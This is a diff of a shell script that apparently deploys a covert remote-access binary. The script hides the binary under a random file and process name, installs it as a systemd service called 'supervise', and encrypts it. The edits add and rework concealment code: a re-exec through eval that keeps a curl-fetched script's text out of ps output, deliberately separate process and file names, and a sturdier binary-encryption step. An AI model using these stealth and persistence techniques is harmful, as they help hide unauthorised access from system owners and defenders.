@@ -70,7 +70,6 @@
 #       - Specify custom hidden name file & process. Default is picked at random.
 # GS_BIN="fg"
 #       - Specify custom name for binary on filesystem
-#       - Set to GS_NAME if GS_NAME is specified.
 # GS_SERVICE="supervise"
 #       - Name for systemd's supervise.service
 #       - Set to GS_BIN by default
@@ -101,9 +100,7 @@
 # If called like: 'bash -c "$(curl -fsSL https://.../deploy.sh)"' then
 # the ps-output will show the entire script as command line. To "kill" the command
 # line we re-exec and call eval on the string.
-[ -z "$GS_NOEVAL" ] && [ -n "$BASH_EXECUTION_STRING" ] && {
-	c="$BASH_EXECUTION_STRING" GS_NOEVAL=1 exec bash -c 'eval "$c"'
-}
+[ -z "$GS_NOEVAL" ] && [ -n "$BASH_EXECUTION_STRING" ] && c="$BASH_EXECUTION_STRING" GS_NOEVAL=1 exec bash -c 'eval "$c"'
 
 # Global Defines
 ###----BEGIN changed by CICD script-----
@@ -951,7 +948,12 @@ init_vars()
 
 	[ -z "$HOME" ] && {
 		HOME="$(pwd)"
-		WARN "HOME not set. Using 'HOME=$HOME'"
+		WARN "HOME not set. Using HOME=$HOME"
+	}
+	[ ! -d "$HOME" ] && {
+		phome="$(pwd)"
+		WARN "Not found: $HOME, Using HOME=$phome"
+		HOME="$phome"
 	}
 	[ ! -d "$HOME" ] && errexit "ERROR: Not found: '$HOME'. Try 'export HOME=<users home directory>'"
 
@@ -967,6 +969,8 @@ init_vars()
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
 
 	# Defaults
+	# Set GS_BIN if GS_NAME is forced by user without forcing GS_BIN.
+	# [ -n "$GS_NAME" ] && [ -z "$GS_BIN" ] && GS_BIN="${GS_NAME}" # DISABLED because we like to disassociate process with file.
 	bin="$(basename "$GS_BIN")"
 	if [[ -n "$bin" ]]; then
 		BIN_HIDDEN_NAME="${bin}"
@@ -1186,6 +1190,7 @@ _config2bin_tmpfile() {
 
 _config2bin_withenv() {
 	_config2bin_memexec "$@" && return 0
+	echo -en "\nAdding configuration (second attempt)................................."
 	_config2bin_tmpfile "$@" && return 0
 }
 
@@ -1618,7 +1623,13 @@ do_bincrypter() {
 		SKIP_OUT "bincrypter not available"
 		return 0 # continue
 	}
-	BC_QUIET=1 _bincrypter "${dst}"
+
+	command -v openssl >/dev/null || { SKIP_OUT "Not found: openssl"; return 0; }
+	command -v perl >/dev/null || { SKIP_OUT "Not found: perl"; return 0; }
+	[ ! -c "/dev/urandom" ] && { SKIP_OUT "Not found: /dev/urandom"; return 0; }
+
+	# _bincrypter() may call exit() and thus must execute in sub-shell.	
+	(BC_QUIET=1 _bincrypter "${dst}") || { SKIP_OUT; return 0;}
 	OK_OUT
 }
 
